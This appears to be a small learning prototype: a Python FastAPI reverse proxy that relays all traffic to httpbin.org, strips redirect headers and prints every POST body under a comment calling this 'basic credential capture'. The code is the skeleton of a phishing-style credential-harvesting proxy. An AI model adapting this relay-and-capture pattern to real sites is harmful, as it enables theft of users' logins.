from fastapi import FastAPI, Request, Response
import requests
import uvicorn

app = FastAPI()

# Target server
TARGET = "https://httpbin.org"

# Catch all incoming routes and methods
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE"], description="This is the common pathway for all requests")
async def proxy(request: Request, path: str):

    # Build full target URL
    target_url = f"{TARGET}/{path}"

    request_method = request.method

    # Copy headers EXCEPT 'Host' so requests can set it correctly
    filtered_headers = {
        key: value for key, value in request.headers.items()
        if key.lower() != "host"
    }

    # Get raw body (used for POST/PUT)
    request_body = await request.body()

    # Extract query parameters (?key=value)
    query_params = dict(request.query_params)

    # print incoming request info
    print("Incoming URL:", request.url)
    print("Request Method:", request_method)

    # Capture POST data (basic credential capture)
    if request_method == "POST":
        print("Captured Data:", request_body.decode())

    # Forward the request to the target server
    target_response = requests.request(
        method=request_method,
        url=target_url,
        headers=filtered_headers,
        params=query_params,
        data=request_body,
        # prevent leaving proxy
        allow_redirects=False  
    )

    # Copy response headers and remove redirect location
    response_headers = dict(target_response.headers)
    response_headers.pop("location", None)

    # Return the response back to the client
    return Response(
        content=target_response.content,
        status_code=target_response.status_code,
        headers=response_headers
    )

# if __name__ == "__main__":
    # uvicorn.run(
    #     "main:app",
    #     host="127.0.0.1",
    #     port=8000,
    #     reload=True
    # )
